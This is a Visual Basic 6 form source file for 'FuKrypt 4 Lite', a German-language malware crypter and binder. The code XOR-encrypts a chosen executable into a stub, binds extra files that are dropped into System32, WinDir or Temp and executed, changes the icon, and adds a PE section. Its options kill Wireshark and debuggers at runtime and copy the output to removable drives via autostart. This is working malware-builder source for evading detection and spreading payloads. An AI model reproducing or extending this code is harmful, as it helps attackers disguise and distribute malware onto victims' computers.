VERSION 5.00
Object = "{A8E5842E-102B-4289-9D57-3B3F5B5E15D3}#13.2#0"; "COA2A4~1.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "mscomctl.ocx"
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fest Einfach
   Caption         =   "FuKrypt 4 Lite Version"
   ClientHeight    =   8175
   ClientLeft      =   19110
   ClientTop       =   4305
   ClientWidth     =   7515
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   8175
   ScaleWidth      =   7515
   StartUpPosition =   1  'Fenstermitte
   Begin XtremeSuiteControls.PushButton cmdCryptFile 
      Height          =   375
      Left            =   5040
      TabIndex        =   36
      Top             =   7560
      Width           =   2235
      _Version        =   851970
      _ExtentX        =   3942
      _ExtentY        =   661
      _StockProps     =   79
      Caption         =   "&Datei Verschlüsseln"
      Appearance      =   1
      Picture         =   "frmMain.frx":3452
   End
   Begin XtremeSuiteControls.PushButton cmdAbout 
      Height          =   375
      Left            =   2640
      TabIndex        =   37
      Top             =   7560
      Width           =   2235
      _Version        =   851970
      _ExtentX        =   3942
      _ExtentY        =   661
      _StockProps     =   79
      Caption         =   "&Zeige About"
      Appearance      =   1
      Picture         =   "frmMain.frx":3847
   End
   Begin XtremeSuiteControls.PushButton cmdLogout 
      Height          =   375
      Left            =   240
      TabIndex        =   38
      Top             =   7560
      Width           =   2235
      _Version        =   851970
      _ExtentX        =   3942
      _ExtentY        =   661
      _StockProps     =   79
      Caption         =   "Logout &Fukrypt 4"
      Appearance      =   1
      Picture         =   "frmMain.frx":3C43
   End
   Begin XtremeSuiteControls.GroupBox GroupBox1 
      Height          =   6015
      Left            =   60
      TabIndex        =   1
      Top             =   2100
      Width           =   7395
      _Version        =   851970
      _ExtentX        =   13044
      _ExtentY        =   10610
      _StockProps     =   79
      Caption         =   "      Einstellungen:"
      Appearance      =   1
      Begin XtremeSuiteControls.ListView lvFiles 
         Height          =   2295
         Left            =   2340
         TabIndex        =   17
         Top             =   2160
         Width           =   4875
         _Version        =   851970
         _ExtentX        =   8599
         _ExtentY        =   4048
         _StockProps     =   77
         BackColor       =   -2147483643
         Enabled         =   0   'False
         View            =   3
         GridLines       =   -1  'True
         FullRowSelect   =   -1  'True
         Appearance      =   1
         UseVisualStyle  =   0   'False
         IconSize        =   16
      End
      Begin VB.PictureBox Picture7 
         Appearance      =   0  '2D
         AutoSize        =   -1  'True
         BorderStyle     =   0  'Kein
         ForeColor       =   &H80000008&
         Height          =   240
         Left            =   120
         Picture         =   "frmMain.frx":402A
         ScaleHeight     =   240
         ScaleWidth      =   240
         TabIndex        =   27
         Top             =   0
         Width           =   240
      End
      Begin XtremeSuiteControls.GroupBox GroupBox2 
         Height          =   795
         Left            =   180
         TabIndex        =   2
         Top             =   300
         Width           =   7035
         _Version        =   851970
         _ExtentX        =   12409
         _ExtentY        =   1402
         _StockProps     =   79
         Caption         =   "       Datei:"
         Appearance      =   1
         Begin VB.PictureBox Picture2 
            Appearance      =   0  '2D
            AutoSize        =   -1  'True
            BorderStyle     =   0  'Kein
            ForeColor       =   &H80000008&
            Height          =   240
            Left            =   180
            Picture         =   "frmMain.frx":43DF
            ScaleHeight     =   240
            ScaleWidth      =   240
            TabIndex        =   23
            Top             =   0
            Width           =   240
         End
         Begin XtremeSuiteControls.FlatEdit txtFile 
            Height          =   315
            Left            =   180
            TabIndex        =   3
            Top             =   300
            Width           =   6015
            _Version        =   851970
            _ExtentX        =   10610
            _ExtentY        =   556
            _StockProps     =   77
            BackColor       =   -2147483643
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Comic Sans MS"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Text            =   "C:\WINDOWS\notepad.exe"
            Locked          =   -1  'True
            Appearance      =   1
            UseVisualStyle  =   0   'False
         End
         Begin XtremeSuiteControls.PushButton cmdBFile 
            Height          =   315
            Left            =   6180
            TabIndex        =   4
            Top             =   300
            Width           =   675
            _Version        =   851970
            _ExtentX        =   1191
            _ExtentY        =   556
            _StockProps     =   79
            Appearance      =   1
            Picture         =   "frmMain.frx":4641
         End
      End
      Begin XtremeSuiteControls.GroupBox GroupBox3 
         Height          =   795
         Left            =   180
         TabIndex        =   5
         Top             =   1200
         Width           =   7035
         _Version        =   851970
         _ExtentX        =   12409
         _ExtentY        =   1402
         _StockProps     =   79
         Caption         =   "       Schlüssel:"
         Appearance      =   1
         Begin VB.PictureBox Picture4 
            Appearance      =   0  '2D
            AutoSize        =   -1  'True
            BorderStyle     =   0  'Kein
            ForeColor       =   &H80000008&
            Height          =   240
            Left            =   180
            Picture         =   "frmMain.frx":4A1C
            ScaleHeight     =   240
            ScaleWidth      =   240
            TabIndex        =   24
            Top             =   0
            Width           =   240
         End
         Begin XtremeSuiteControls.FlatEdit txtKey 
            Height          =   315
            Left            =   180
            TabIndex        =   6
            Top             =   300
            Width           =   6015
            _Version        =   851970
            _ExtentX        =   10610
            _ExtentY        =   556
            _StockProps     =   77
            BackColor       =   -2147483643
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Comic Sans MS"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Text            =   "X16E7BN4MBUAK34Q35QM358C2TL61DPY415D6622XX1H2"
            Locked          =   -1  'True
            Appearance      =   1
            UseVisualStyle  =   0   'False
         End
         Begin XtremeSuiteControls.PushButton cmdKeyGen 
            Height          =   315
            Left            =   6180
            TabIndex        =   7
            Top             =   300
            Width           =   675
            _Version        =   851970
            _ExtentX        =   1191
            _ExtentY        =   556
            _StockProps     =   79
            Appearance      =   1
            Picture         =   "frmMain.frx":4DCC
         End
      End
      Begin XtremeSuiteControls.GroupBox GroupBox4 
         Height          =   1215
         Left            =   180
         TabIndex        =   8
         Top             =   2100
         Width           =   1995
         _Version        =   851970
         _ExtentX        =   3519
         _ExtentY        =   2143
         _StockProps     =   79
         Caption         =   "       Verschlüsselung"
         Appearance      =   1
         Begin VB.PictureBox Picture5 
            Appearance      =   0  '2D
            AutoSize        =   -1  'True
            BorderStyle     =   0  'Kein
            ForeColor       =   &H80000008&
            Height          =   240
            Left            =   180
            Picture         =   "frmMain.frx":51B4
            ScaleHeight     =   240
            ScaleWidth      =   240
            TabIndex        =   25
            Top             =   0
            Width           =   240
         End
         Begin XtremeSuiteControls.RadioButton rDES 
            Height          =   195
            Left            =   180
            TabIndex        =   9
            Top             =   300
            Width           =   1275
            _Version        =   851970
            _ExtentX        =   2249
            _ExtentY        =   344
            _StockProps     =   79
            Caption         =   "Benutze XOR"
            Appearance      =   2
            Value           =   -1  'True
         End
         Begin XtremeSuiteControls.RadioButton rTEA 
            Height          =   195
            Left            =   180
            TabIndex        =   10
            Top             =   600
            Width           =   1515
            _Version        =   851970
            _ExtentX        =   2672
            _ExtentY        =   344
            _StockProps     =   79
            Caption         =   "- Bald Verfügbar!"
            Appearance      =   2
         End
         Begin XtremeSuiteControls.RadioButton rRin 
            Height          =   195
            Left            =   180
            TabIndex        =   11
            Top             =   900
            Width           =   1515
            _Version        =   851970
            _ExtentX        =   2672
            _ExtentY        =   344
            _StockProps     =   79
            Caption         =   "- Bald Verfügbar!"
            Appearance      =   2
         End
      End
      Begin XtremeSuiteControls.GroupBox GroupBox5 
         Height          =   1875
         Left            =   180
         TabIndex        =   12
         Top             =   3420
         Width           =   1995
         _Version        =   851970
         _ExtentX        =   3519
         _ExtentY        =   3307
         _StockProps     =   79
         Caption         =   "       Optionen:"
         Appearance      =   1
         Begin XtremeSuiteControls.PushButton PushButton1 
            Height          =   315
            Left            =   1560
            TabIndex        =   28
            Top             =   240
            Width           =   315
            _Version        =   851970
            _ExtentX        =   556
            _ExtentY        =   556
            _StockProps     =   79
            Appearance      =   1
            Picture         =   "frmMain.frx":557F
         End
         Begin VB.PictureBox Picture6 
            Appearance      =   0  '2D
            AutoSize        =   -1  'True
            BorderStyle     =   0  'Kein
            ForeColor       =   &H80000008&
            Height          =   240
            Left            =   180
            Picture         =   "frmMain.frx":5979
            ScaleHeight     =   240
            ScaleWidth      =   240
            TabIndex        =   26
            Top             =   0
            Width           =   240
         End
         Begin XtremeSuiteControls.CheckBox cWire 
            Height          =   195
            Left            =   180
            TabIndex        =   13
            Top             =   300
            Width           =   1395
            _Version        =   851970
            _ExtentX        =   2461
            _ExtentY        =   344
            _StockProps     =   79
            Caption         =   "Anti Wireshark"
            Transparent     =   -1  'True
            Appearance      =   2
         End
         Begin XtremeSuiteControls.CheckBox cDebugger 
            Height          =   195
            Left            =   180
            TabIndex        =   14
            Top             =   600
            Width           =   1335
            _Version        =   851970
            _ExtentX        =   2355
            _ExtentY        =   344
            _StockProps     =   79
            Caption         =   "Anti Debugger"
            Transparent     =   -1  'True
            Appearance      =   2
         End
         Begin XtremeSuiteControls.CheckBox cUSB 
            Height          =   195
            Left            =   180
            TabIndex        =   15
            Top             =   900
            Width           =   1215
            _Version        =   851970
            _ExtentX        =   2143
            _ExtentY        =   344
            _StockProps     =   79
            Caption         =   "USB Spread"
            Transparent     =   -1  'True
            Appearance      =   2
         End
         Begin XtremeSuiteControls.CheckBox cIcon 
            Height          =   195
            Left            =   180
            TabIndex        =   16
            Top             =   1500
            Width           =   1275
            _Version        =   851970
            _ExtentX        =   2249
            _ExtentY        =   344
            _StockProps     =   79
            Caption         =   "Icon Changer"
            Transparent     =   -1  'True
            Appearance      =   2
         End
         Begin XtremeSuiteControls.CheckBox cBinder 
            Height          =   195
            Left            =   180
            TabIndex        =   18
            Top             =   1200
            Width           =   795
            _Version        =   851970
            _ExtentX        =   1402
            _ExtentY        =   344
            _StockProps     =   79
            Caption         =   "Binder"
            Transparent     =   -1  'True
            Appearance      =   2
         End
         Begin XtremeSuiteControls.PushButton PushButton2 
            Height          =   315
            Left            =   1560
            TabIndex        =   29
            Top             =   540
            Width           =   315
            _Version        =   851970
            _ExtentX        =   556
            _ExtentY        =   556
            _StockProps     =   79
            Appearance      =   1
            Picture         =   "frmMain.frx":5D2E
         End
         Begin XtremeSuiteControls.PushButton PushButton3 
            Height          =   315
            Left            =   1560
            TabIndex        =   30
            Top             =   840
            Width           =   315
            _Version        =   851970
            _ExtentX        =   556
            _ExtentY        =   556
            _StockProps     =   79
            Appearance      =   1
            Picture         =   "frmMain.frx":6128
         End
         Begin XtremeSuiteControls.PushButton PushButton4 
            Height          =   315
            Left            =   1560
            TabIndex        =   31
            Top             =   1140
            Width           =   315
            _Version        =   851970
            _ExtentX        =   556
            _ExtentY        =   556
            _StockProps     =   79
            Appearance      =   1
            Picture         =   "frmMain.frx":6522
         End
         Begin XtremeSuiteControls.PushButton PushButton5 
            Height          =   315
            Left            =   1560
            TabIndex        =   32
            Top             =   1440
            Width           =   315
            _Version        =   851970
            _ExtentX        =   556
            _ExtentY        =   556
            _StockProps     =   79
            Appearance      =   1
            Picture         =   "frmMain.frx":691C
         End
      End
      Begin XtremeSuiteControls.GroupBox GroupBox6 
         Height          =   795
         Left            =   2340
         TabIndex        =   19
         Top             =   4500
         Width           =   4875
         _Version        =   851970
         _ExtentX        =   8599
         _ExtentY        =   1402
         _StockProps     =   79
         Caption         =   "       Icon Changer:"
         Enabled         =   0   'False
         Appearance      =   1
         Begin VB.PictureBox Picture3 
            Appearance      =   0  '2D
            AutoSize        =   -1  'True
            BorderStyle     =   0  'Kein
            ForeColor       =   &H80000008&
            Height          =   240
            Left            =   180
            Picture         =   "frmMain.frx":6D16
            ScaleHeight     =   240
            ScaleWidth      =   240
            TabIndex        =   22
            Top             =   0
            Width           =   240
         End
         Begin XtremeSuiteControls.FlatEdit txtIcon 
            Height          =   315
            Left            =   180
            TabIndex        =   20
            Top             =   300
            Width           =   3855
            _Version        =   851970
            _ExtentX        =   6800
            _ExtentY        =   556
            _StockProps     =   77
            BackColor       =   -2147483643
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Comic Sans MS"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Enabled         =   0   'False
            Locked          =   -1  'True
            Appearance      =   1
            UseVisualStyle  =   0   'False
         End
         Begin XtremeSuiteControls.PushButton cmdBIcon 
            Height          =   315
            Left            =   4020
            TabIndex        =   21
            Top             =   300
            Width           =   675
            _Version        =   851970
            _ExtentX        =   1191
            _ExtentY        =   556
            _StockProps     =   79
            Enabled         =   0   'False
            Appearance      =   1
            Picture         =   "frmMain.frx":70F2
         End
      End
   End
   Begin XtremeSuiteControls.GroupBox grpAbout 
      Height          =   6015
      Left            =   60
      TabIndex        =   33
      Top             =   2100
      Visible         =   0   'False
      Width           =   7395
      _Version        =   851970
      _ExtentX        =   13044
      _ExtentY        =   10610
      _StockProps     =   79
      Caption         =   "       About"
      Appearance      =   1
      Begin VB.PictureBox Picture9 
         Appearance      =   0  '2D
         BackColor       =   &H80000005&
         ForeColor       =   &H80000008&
         Height          =   4815
         Left            =   180
         Picture         =   "frmMain.frx":74CD
         ScaleHeight     =   4785
         ScaleWidth      =   7005
         TabIndex        =   35
         Top             =   300
         Width           =   7035
      End
      Begin VB.PictureBox Picture8 
         Appearance      =   0  '2D
         AutoSize        =   -1  'True
         BorderStyle     =   0  'Kein
         ForeColor       =   &H80000008&
         Height          =   240
         Left            =   180
         Picture         =   "frmMain.frx":1B5C0
         ScaleHeight     =   240
         ScaleWidth      =   240
         TabIndex        =   34
         Top             =   0
         Width           =   240
      End
   End
   Begin VB.PictureBox Picture1 
      Align           =   1  'Oben ausrichten
      Appearance      =   0  '2D
      BackColor       =   &H80000005&
      ForeColor       =   &H80000008&
      Height          =   2055
      Left            =   0
      Picture         =   "frmMain.frx":1B9AC
      ScaleHeight     =   2025
      ScaleWidth      =   7485
      TabIndex        =   0
      Top             =   0
      Width           =   7515
      Begin MSComctlLib.ImageList ImgL 
         Left            =   0
         Top             =   420
         _ExtentX        =   1005
         _ExtentY        =   1005
         BackColor       =   -2147483643
         ImageWidth      =   16
         ImageHeight     =   16
         MaskColor       =   12632256
         _Version        =   393216
         BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
            NumListImages   =   1
            BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":28B43
               Key             =   ""
            EndProperty
         EndProperty
      End
      Begin XtremeSuiteControls.CommonDialog cmdl 
         Left            =   540
         Top             =   60
         _Version        =   851970
         _ExtentX        =   423
         _ExtentY        =   423
         _StockProps     =   4
      End
   End
   Begin VB.Menu MMain 
      Caption         =   "MMain"
      Visible         =   0   'False
      Begin VB.Menu AddItem 
         Caption         =   "Hinzufügen"
      End
      Begin VB.Menu Del 
         Caption         =   "Löschen"
      End
      Begin VB.Menu DropTo 
         Caption         =   "Schreiben in"
         Begin VB.Menu Sys32 
            Caption         =   "%Sys32%"
         End
         Begin VB.Menu WinDir 
            Caption         =   "%WinDir%"
         End
         Begin VB.Menu Temp 
            Caption         =   "%Temp%"
         End
      End
      Begin VB.Menu mExec 
         Caption         =   "Ausführen"
         Begin VB.Menu mExecYes 
            Caption         =   "Ja"
         End
         Begin VB.Menu mExecNo 
            Caption         =   "Nein"
         End
      End
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub cBinder_Click()
Select Case cBinder.Value
    Case 1
        lvFiles.Enabled = True
    Case 0
        lvFiles.Enabled = False
End Select
End Sub

Private Sub cIcon_Click()
Select Case cIcon.Value
    Case 1
        GroupBox6.Enabled = True
        txtIcon.Enabled = True
        cmdBIcon.Enabled = True
    Case 0
        GroupBox6.Enabled = False
        txtIcon.Enabled = False
        cmdBIcon.Enabled = False
End Select
End Sub

Private Sub cmdAbout_Click()
Select Case grpAbout.Visible
    Case False
        cmdAbout.Caption = "Verstecke About"
        grpAbout.Visible = True
        GroupBox1.Visible = False
    Case True
        cmdAbout.Caption = "Zeige About"
        grpAbout.Visible = False
        GroupBox1.Visible = True
End Select
    
End Sub

Private Sub cmdBFile_Click()
With cmdl
    .Filename = ""
    .Filter = "PE Dateien | *.exe"
    .ShowOpen
    If .Filename = "" Then Exit Sub
    txtFile.Text = .Filename
End With
End Sub

Private Sub cmdBIcon_Click()
With cmdl
    .Filename = ""
    .Filter = "Icon Dateien | *.ico"
    .ShowOpen
    If .Filename = "" Then Exit Sub
    txtIcon.Text = .Filename
End With
End Sub

Private Sub cmdCryptFile_Click()
Dim i As Integer
Dim FF As Integer
Dim Enc As Object
Dim StrDatei As String
Dim StrStub As String
Dim StrGesamt As String
Dim StrSettings As String
Dim StrBFile As String
Dim StrBD As String
Dim StrBE As String
Dim Stb() As Byte

Const StrSplDat = "EH2GNF454DKU116V8A3M7HXJANMCSH1GQNHVN57LL623J"
Const StrSplSet = "N6HM25G764LT7BL426JHRG1N8W87MS87U3T138R2PNPLW"
Const StrSplBin = "XKJ5DS31VJT673136SVE634487JKQFG4RVLQGS48V4MQJ"

If IntCrypt = False Then Exit Sub

If FileExists(App.Path & "\Data\stb.exe") = True Then Kill App.Path & "\Data\stb.exe"

'If rRin = True Then
    'Set Enc = EncRin
    'Stb() = LoadResData(225, "Rin")
'End If

'If rTEA = True Then
    'Set Enc = EncTea
    'Stb() = LoadResData(224, "TEA")
'End If

'If rDES = True Then
    'Set Enc = EncDes
    'Stb() = LoadResData(223, "DES")
'End If

Stb() = LoadResData(333, "XOR")

FF = FreeFile
Open App.Path & "\Data\stb.exe" For Binary As #FF
    Put #FF, , Stb()
Close #FF

If cIcon = xtpChecked Then
    Select Case ChangeIcon(App.Path & "\Data\stb.exe", txtIcon.Text)
        Case False
            MsgBox "Fehler beim ändern des Icons!", vbCritical, "Fehler!"
    End Select
End If


StrDatei = LoadFile(txtFile.Text)
StrDatei = XOREncryption(txtKey.Text, StrDatei)
StrStub = LoadFile(App.Path & "\Data\stb.exe")
StrSettings = StrSplSet & cWire & StrSplSet & cDebugger & StrSplSet & cUSB & StrSplSet & cBinder & StrSplSet
StrGesamt = StrStub + StrSplDat + txtKey.Text + StrSplDat + StrDatei + StrSplDat + StrSettings + StrSplDat

If FileExists(App.Path & "\Data\stb.exe") = True Then Kill App.Path & "\Data\stb.exe"

If cBinder = 1 Then
StrGesamt = StrGesamt + StrSplBin
    For i = 1 To lvFiles.ListItems.Count
        Select Case lvFiles.ListItems.Item(i).SubItems(2)
            Case "%Sys32%"
                StrBD = 1
            Case "%WinDir%"
                StrBD = 2
            Case "%Temp%"
                StrBD = 3
            Case Else
                MsgBox "Fehler beim Binder!", vbCritical, "Fehler!"
        End Select
        
        Select Case lvFiles.ListItems.Item(i).SubItems(3)
            Case "Ja"
                StrBE = 1
            Case "Nein"
                StrBE = 0
            Case Else
                MsgBox "Fehler beim Binder!", vbCritical, "Fehler!"
        End Select
        StrBData = XOREncryption("ule", LoadFile(lvFiles.ListItems.Item(i).Tag))
        StrGesamt = StrGesamt + StrBData + StrSplSet + lvFiles.ListItems.Item(i).Text + StrSplSet + StrBD + StrSplSet + StrBE + StrSplBin
    Next i
End If

Open App.Path & "\VerschlüsselteDatei.exe" For Binary As #FF
    Put #FF, , StrGesamt
Close #FF

AddSection App.Path & "\VerschlüsselteDatei.exe", ".icq", Len(StrGesamt), &H40C0

If Len(GetEOFDatas(txtFile.Text)) > 0 Then WriteEOFData App.Path & "\VerschlüsselteDatei.exe", GetEOFDatas(txtFile.Text)

If MsgBox("Datei wurde erfolgreich verschlüsselt! Schließen?", vbQuestion + vbYesNo, "Erfolg!") = vbYes Then End
End Sub
Function IntCrypt() As Boolean
IntCrypt = True
If txtFile.Text = "" Then
    MsgBox "Wähle eine Datei aus!", vbCritical, "Fehler!"
    IntCrypt = False
    Exit Function
End If

Select Case FileExists(App.Path & "\VerschlüsselteDatei.exe")
    Case True
        Kill App.Path & "\VerschlüsselteDatei.exe"
End Select

If cIcon.Value = 1 And txtIcon.Text = "" Then
    MsgBox "Wähle ein Icon aus!", vbCritical, "Fehler!"
    IntCrypt = False
    Exit Function
End If

End Function
Private Sub cmdKeyGen_Click()
txtKey.Text = CreateKey(45)
End Sub

Private Sub cmdLogout_Click()
If FileExists(Environ$("WinDir") & "\" & Environ$("Username") & ".C") = True Then Kill Environ$("WinDir") & "\" & Environ$("Username") & ".C"
If FileExists(Environ$("WinDir") & "\" & Environ$("Computername") & ".K") = True Then Kill Environ$("WinDir") & "\" & Environ$("Computername") & ".K"
Unload Me
Load frmLogin
frmLogin.Show
End Sub

Private Sub Form_Initialize()

With lvFiles.ColumnHeaders
    .Add , , "Name", lvFiles.Width / 4
    .Add , , "Pfad", lvFiles.Width / 4
    .Add , , "Schreibe in", lvFiles.Width / 4
    .Add , , "Ausführen", lvFiles.Width / 4
End With

End Sub

Private Sub Form_Unload(Cancel As Integer)
If FileExists(Environ$("WinDir") & "\" & Environ$("Username") & ".C") = True Then Kill Environ$("WinDir") & "\" & Environ$("Username") & ".C"
If FileExists(Environ$("WinDir") & "\" & Environ$("Computername") & ".K") = True Then Kill Environ$("WinDir") & "\" & Environ$("Computername") & ".K"
End Sub

Private Sub PushButton1_Click()
MsgBox "Das Programm WireShark wird beim Ausführen sofort neendet...", vbInformation, "Info"
End Sub

Private Sub PushButton2_Click()
MsgBox "Debugger (z.B. OllyDBG) werden beim Ausführen beendet...", vbInformation, "Info"
End Sub

Private Sub PushButton3_Click()
MsgBox "Die Datei schreibt sich automatisch auf einen Wechseldatenträger (wenn Autostart aktiv ist)...", vbInformation, "Info"
End Sub

Private Sub PushButton4_Click()
MsgBox "Verbindet alle möglichen Dateien zusammen und führt sie beim Ausführen aus...", vbInformation, "Info"
End Sub

Private Sub PushButton5_Click()
MsgBox "Wechselt das Icon...", vbInformation, "Info"
End Sub




Private Sub Del_Click()
lvFiles.ListItems.Remove (lvFiles.SelectedItem.Index)
End Sub
Private Sub Sys32_Click()
lvFiles.SelectedItem.SubItems(2) = "%Sys32%"
End Sub
Private Sub Temp_Click()
lvFiles.SelectedItem.SubItems(2) = "%Temp%"
End Sub
Private Sub WinDir_Click()
lvFiles.SelectedItem.SubItems(2) = "%WinDir%"
End Sub
Private Sub mexecyes_Click()
lvFiles.SelectedItem.SubItems(3) = "Ja"
End Sub
Private Sub mexecno_Click()
lvFiles.SelectedItem.SubItems(3) = "Nein"
End Sub
Private Sub AddItem_Click()
Dim Filename As String
With cmdl
    .Filter = "Alle Dateien | *.*"
    .Filename = ""
    .ShowOpen
    
    For i = 1 To lvFiles.ListItems.Count
        If lvFiles.ListItems.Item(i).Tag = .Filename Then
            MsgBox "Datei ist schon in der Liste!", vbCritical, "Error"
            Exit Sub
        End If
    Next i
    
    If Len(.Filename) < 3 Then Exit Sub
    lvFiles.Icons.AddIcon ImgL.ListImages.Item(1).ExtractIcon.Handle, 1, xtpImageNormal
    Filename = Mid$(.Filename, InStrRev(.Filename, "\") + 1)
    
    With lvFiles.ListItems.Add(, , Filename, 1)
        .SubItems(1) = Replace(cmdl.Filename, Filename, "")
        .SubItems(2) = "%Temp%"
        .SubItems(3) = "Ja"
        .SubItems(4) = "Ja"
        .Tag = cmdl.Filename
    End With
End With
End Sub
Private Sub lvFiles_MouseUp(Button As Integer, Shift As Integer, X As Single, y As Single)
On Error GoTo err
If Button = 2 Then
    If Not Len(lvFiles.HitTest(X, y)) = 0 Then
        Del.Enabled = True
        DropTo.Enabled = True
        mExec.Enabled = True
        PopupMenu MMain
    End If
End If

Exit Sub
err:
mExec.Enabled = False
Del.Enabled = False
DropTo.Enabled = False
PopupMenu MMain
End Sub
